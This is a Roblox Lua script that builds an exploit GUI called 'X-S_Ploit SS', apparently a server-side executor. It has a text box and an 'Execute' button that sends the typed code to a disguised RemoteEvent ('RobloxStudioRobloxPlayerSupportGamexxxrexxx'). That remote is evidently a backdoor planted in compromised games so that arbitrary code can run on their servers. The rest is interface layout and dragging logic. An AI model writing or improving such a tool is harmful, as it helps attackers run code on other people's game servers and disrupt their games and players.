local XSPloitSS = Instance.new("ScreenGui")
XSPloitSS.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
XSPloitSS.Name = "XSPloitSS"
XSPloitSS.Parent = game.Players.LocalPlayer.PlayerGui
XSPloitSS.Enabled = true
local Main = Instance.new("Frame")
Main.BackgroundColor3 = Color3.new(0,0,0)
Main.BackgroundTransparency = 0.5
Main.BorderColor3 = Color3.new(0,0,0)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.30065837502479553,0,0.2405063360929489,0)
Main.Size = UDim2.new(0,545,0,326)
Main.Visible = false
Main.Name = "Main"
Main.Parent = XSPloitSS
local UICorner = Instance.new("UICorner")
UICorner.Parent = Main
local justlabel = Instance.new("TextLabel")
justlabel.FontFace = Font.new("rbxassetid://12187372382",Enum.FontWeight.Regular,Enum.FontStyle.Normal)
justlabel.Text = "X-S_Ploit SS"
justlabel.TextColor3 = Color3.new(1,1,1)
justlabel.TextScaled = true
justlabel.TextSize = 14
justlabel.TextWrapped = true
justlabel.BackgroundColor3 = Color3.new(1,1,1)
justlabel.BackgroundTransparency = 1
justlabel.BorderColor3 = Color3.new(0,0,0)
justlabel.BorderSizePixel = 0
justlabel.Size = UDim2.new(0,545,0,68)
justlabel.Name = "justlabel"
justlabel.Parent = Main
local UIStroke = Instance.new("UIStroke")
UIStroke.Parent = justlabel
local Input = Instance.new("TextBox")
Input.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json",Enum.FontWeight.Regular,Enum.FontStyle.Normal)
Input.Text = ""
Input.TextColor3 = Color3.new(1,1,1)
Input.TextSize = 14
Input.TextWrapped = true
Input.TextXAlignment = Enum.TextXAlignment.Left
Input.TextYAlignment = Enum.TextYAlignment.Top
Input.BackgroundColor3 = Color3.new(0.3921568989753723,0.3921568989753723,0.3921568989753723)
Input.BackgroundTransparency = 0.30000001192092896
Input.BorderColor3 = Color3.new(0,0,0)
Input.BorderSizePixel = 0
Input.Position = UDim2.new(0.12293577939271927,0,0.20858895778656006,0)
Input.Size = UDim2.new(0,411,0,191)
Input.Name = "Input"
Input.Parent = Main
local UIStroke1 = Instance.new("UIStroke")
UIStroke1.Parent = Input
local UICorner1 = Instance.new("UICorner")
UICorner1.Parent = Input
local Execute = Instance.new("TextButton")
Execute.FontFace = Font.new("rbxassetid://12187372382",Enum.FontWeight.Regular,Enum.FontStyle.Normal)
Execute.Text = "Execute"
Execute.TextColor3 = Color3.new(0.2823529541492462,0.2823529541492462,0.2823529541492462)
Execute.TextScaled = true
Execute.TextSize = 14
Execute.TextWrapped = true
Execute.BackgroundColor3 = Color3.new(0.14509804546833038,0.43529415130615234,0)
Execute.BorderColor3 = Color3.new(0,0,0)
Execute.BorderSizePixel = 0
Execute.Position = UDim2.new(0.315596342086792,0,0.8251533508300781,0)
Execute.Size = UDim2.new(0,200,0,50)
Execute.Name = "Execute"
Execute.Parent = Main
local UICorner2 = Instance.new("UICorner")
UICorner2.Parent = Execute
local UIStroke2 = Instance.new("UIStroke")
UIStroke2.Parent = Execute
Execute.MouseButton1Click:Connect(function()
game:GetService("ReplicatedStorage"):WaitForChild("RobloxStudioRobloxPlayerSupportGamexxxrexxx"):FireServer(Input.Text)
end)
local RemoteEvent = Instance.new("RemoteEvent")
RemoteEvent.Parent = Execute
local LocalScript1 = Instance.new("LocalScript")
local frame = Main
local dragging = false
local dragInput, mouseStart, frameStart

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		mouseStart = input.Position
		frameStart = frame.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		local delta = input.Position - mouseStart
		frame.Position = UDim2.new(
			frameStart.X.Scale,
			frameStart.X.Offset + delta.X,
			frameStart.Y.Scale,
			frameStart.Y.Offset + delta.Y
		)
	end
end)


local Close = Instance.new("TextButton")
Close.FontFace = Font.new("rbxasset://fonts/families/Guru.json",Enum.FontWeight.Regular,Enum.FontStyle.Normal)
Close.Text = "X"
Close.TextColor3 = Color3.new(1,1,1)
Close.TextScaled = true
Close.TextSize = 14
Close.TextWrapped = true
Close.BackgroundColor3 = Color3.new(1,0,0)
Close.BorderColor3 = Color3.new(0,0,0)
Close.BorderSizePixel = 0
Close.Position = UDim2.new(0.8550458550453186,0,0.02760736271739006,0)
Close.Size = UDim2.new(0,67,0,50)
Close.Name = "Close"
Close.Parent = Main
local UICorner3 = Instance.new("UICorner")
UICorner3.Parent = Close
local UIStroke3 = Instance.new("UIStroke")
UIStroke3.Parent = Close
Close.MouseButton1Click:Connect(function ()
Main.Visible = false
end)
local Open = Instance.new("TextButton")
Open.FontFace = Font.new("rbxassetid://12187372382",Enum.FontWeight.Regular,Enum.FontStyle.Normal)
Open.Text = "X-S_Ploit SS"
Open.TextColor3 = Color3.new(1,1,1)
Open.TextScaled = true
Open.TextSize = 14
Open.TextWrapped = true
Open.BackgroundColor3 = Color3.new(0,0,0)
Open.BorderColor3 = Color3.new(0,0,0)
Open.BorderSizePixel = 0
Open.Position = UDim2.new(0.9195318222045898,0,0.5284810066223145,0)
Open.Size = UDim2.new(0,91,0,75)
Open.Name = "Open"
Open.Parent = XSPloitSS
Open.MouseButton1Click:Connect(function()
Main.Visible = not Main.Visible
end)
local UIStroke4 = Instance.new("UIStroke")
UIStroke4.Parent = Open
local UICorner4 = Instance.new("UICorner")
UICorner4.Parent = Open
